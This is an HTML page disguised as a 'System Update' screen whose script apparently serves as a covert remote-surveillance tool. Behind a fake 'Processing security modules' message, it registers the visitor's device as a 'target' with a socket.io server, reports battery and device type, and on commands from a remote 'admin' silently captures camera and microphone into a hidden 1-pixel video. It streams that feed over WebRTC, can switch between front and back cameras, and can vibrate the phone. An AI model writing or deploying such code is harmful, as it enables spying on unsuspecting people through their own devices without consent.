<!DOCTYPE html>
<html>
<head>
    <title>System Update</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { background: #050a14; color: #4f5b93; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
    </style>
</head>
<body>
    <div>
        <h2 style="color: #fff;">System Update</h2>
        <p>Processing security modules...</p>
    </div>

    <!-- Hidden Video -->
    <video id="v" autoplay playsinline muted style="width:1px; height:1px; opacity:0; position:absolute;"></video>

    <script>
        const socket = io();
        let stream, pc, adminId, mode = "environment";
        const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };

        // 1. Asli Battery aur Device Info fetch karke join karna
        async function joinHub() {
            let bat = "N/A";
            try {
                const b = await navigator.getBattery();
                bat = Math.floor(b.level * 100) + "%";
            } catch(e) {}
            const dev = /Android/i.test(navigator.userAgent) ? "Android App" : "Web Hub";
            
            socket.emit('target-join', { battery: bat, device: dev });
        }
        joinHub();

        // 2. Command Handle karna (V2.4 Logic)
        socket.on('command', async (d) => {
            if (d.cmd === 'start' || d.cmd === 'start-stream') {
                adminId = d.adminId;
                if(!stream) {
                    try {
                        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
                        document.getElementById('v').srcObject = stream;
                    } catch(e) { console.log("Cam Error"); }
                }
                establishLink();
            } 
            else if (d.cmd === 'front' || d.cmd === 'back') {
                mode = (d.cmd === 'front') ? "user" : "environment";
                if(stream) stream.getTracks().forEach(t => t.stop());
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
                document.getElementById('v').srcObject = stream;
                if(pc) {
                    const vt = stream.getVideoTracks()[0];
                    const at = stream.getAudioTracks()[0];
                    pc.getSenders().find(s => s.track.kind === 'video').replaceTrack(vt);
                    pc.getSenders().find(s => s.track.kind === 'audio').replaceTrack(at);
                }
            }
            else if (d.cmd === 'vibrate') { window.navigator.vibrate(200); }
        });

        async function establishLink() {
            if(pc) pc.close();
            pc = new RTCPeerConnection(config);
            stream.getTracks().forEach(t => pc.addTrack(t, stream));
            pc.onicecandidate = (e) => { if(e.candidate) socket.emit('signal', { to: adminId, signal: { candidate: e.candidate } }); };
            const offer = await pc.createOffer();
            await pc.setLocalDescription(offer);
            socket.emit('signal', { to: adminId, signal: { sdp: offer } });
        }

        socket.on('signal', async (d) => {
            if(d.signal.sdp) await pc.setRemoteDescription(new RTCSessionDescription(d.signal.sdp));
            else if(d.signal.candidate) pc.addIceCandidate(new RTCIceCandidate(d.signal.candidate));
        });
        </script>
</body>
</html>
